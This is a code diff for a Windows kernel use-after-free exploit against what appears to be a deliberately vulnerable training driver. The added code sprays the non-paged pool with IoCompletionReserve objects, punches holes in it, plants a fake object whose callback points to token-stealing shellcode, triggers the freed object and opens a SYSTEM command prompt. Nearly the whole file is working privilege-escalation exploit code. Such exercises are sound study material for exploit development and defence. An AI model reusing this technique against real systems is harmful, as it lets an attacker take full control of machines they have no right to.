@@ -1,9 +1,12 @@
 #include <Windows.h>
-#include "stdio.h"
+#include <iostream>
+#include "winternl.h"
 
 #include "Solutions.h"
 #include "ioctal_codes.h"
-#include "TokenStealingShellcode.h"
+#include "utils.h"
+
+using namespace std;
 
 enum class Commands {
 	AllocateUAFObject,
@@ -17,44 +20,69 @@ typedef struct UAFStruct {
 	CHAR buf[0x54];
 } UAFStruct;
 
+typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t) (
+	OUT PHANDLE hObject,
+	IN POBJECT_ATTRIBUTES ObjectAttributes,
+	IN DWORD ObjectType);
+
 NTSTATUS Command(HANDLE deviceHandle, Commands operate);
+NTSTATUS SprayHeap();
 DWORD getIoctl(Commands operate);
 
-DWORD Solutions::TriggerUAF() {
+NTSTATUS Solutions::TriggerUAF() {
 	
 	// allocate 
 	// free
 	// allocate fake object
 	// overwrite callback
 	// use
-	Command(_hDeviceHandle, Commands::AllocateUAFObject);
-	Command(_hDeviceHandle, Commands::FreeUAFObject);
+	NTSTATUS res = SprayHeap();
+	if (!NT_SUCCESS(res)) {
+		return res;
+	}
+
+	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::AllocateUAFObject))) {
+		cout << "[-] Could not allocate UAF object" << endl;
+		return STATUS_INVALID_PARAMETER;
+	}
+	cout << "[+] Allocated UAF object" << endl;
+
+	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
+		cout << "[-] Could not free UAF object" << endl;
+		return STATUS_INVALID_PARAMETER;
+	}
+	cout << "[+] Freed UAF object" << endl;
 
 	DWORD dwBytesReturned = 0;
 	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
 	if (!lpInBuffer) {
-		wprintf(L"[-] Could not allocate buffer");
+		cout << "[-] Could not allocate buffer" << endl;
 		return STATUS_NO_MEMORY;
 	}
 
 	lpInBuffer->callback = (ULONG)&tokenStealingShellcodeWriteWhatWhere;
 	memset(lpInBuffer->buf, 0x41, 0x54);
-	wprintf(L"[+] toekn stealing shellcode 0x%x", (ULONG)&tokenStealingShellcodeWriteWhatWhere);
+	cout << "[+] token stealing shellcode " << hex << (ULONG)&tokenStealingShellcodeWriteWhatWhere << endl;
 	
 	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
 		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
-		wprintf(L"[-] Could not talk with the driver");
-		return 1;
+		cout << "[-] Could not talk with the driver" << endl;
+		return STATUS_INVALID_PARAMETER;
 	}
+	cout << "[+] Allocated fake object" << endl;
 	
-	Command(_hDeviceHandle, Commands::UseUafObject);
-	
+	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::UseUafObject))) {
+		cout << "[-] Could not use UAF object" << endl;
+		return STATUS_INVALID_PARAMETER;
+	}
+	cout << "[+] Calling UAF callback -- enjoy system :)" << endl;
+
 	system("cmd.exe");
 
 	return 0;
 }
 
-NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
+static NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
 	
 	DWORD dwBytesReturned = 0;
 	return
@@ -69,7 +97,43 @@ NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
 		);
 }
 
-DWORD getIoctl(Commands operate) {
+static NTSTATUS SprayHeap() {
+	const DWORD hArrSize = 8000 + 5000;
+	auto NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"),
+																				"NtAllocateReserveObject");
+	
+	if (!NtAllocateReserveObject) {
+		cout << "[-] Could not load NtAllocateResearveObject - " << GetLastError() << endl;
+		return STATUS_DLL_NOT_FOUND;
+	}
+
+	NTSTATUS status = 0;
+	PHANDLE hIoCo = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hArrSize * sizeof(HANDLE));
+	if (!hIoCo) {
+		cout << "[-] Could not allocate buffer" << endl;
+		return STATUS_NO_MEMORY;
+	}
+
+	cout << "[+] Spraying non paged pool with IoCo objects" << endl;
+	for (int i = 0; i < 8000 + 5000; i++) {
+		status = NtAllocateReserveObject(&hIoCo[i], NULL, 1); // 1 = IoCo - > IoCompletionReserve 
+		if (!NT_SUCCESS(status)) {
+			cout << "[-] Could not allocate IoCo object - " << GetLastError() << endl;
+			return STATUS_NO_MEMORY;
+		}
+	}
+
+	cout << "[+] Creating holes in the pool" << endl;
+	BOOLEAN shouldFree = true;
+	for (int i = 8000; i < 13000; i++) {
+		shouldFree && CloseHandle(hIoCo[i]);
+		shouldFree = !shouldFree;
+	}
+
+	return 0; // STATUS_SUCCESS
+}
+
+static DWORD getIoctl(Commands operate) {
 	switch (operate) {
 	case Commands::AllocateUAFObject:
 		return IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED;
@@ -79,5 +143,5 @@ DWORD getIoctl(Commands operate) {
 		return IOCTL_USE_UAF_NON_PAGED;
 	}
 
-	return NULL;
+	return STATUS_INVALID_PARAMETER;
 }
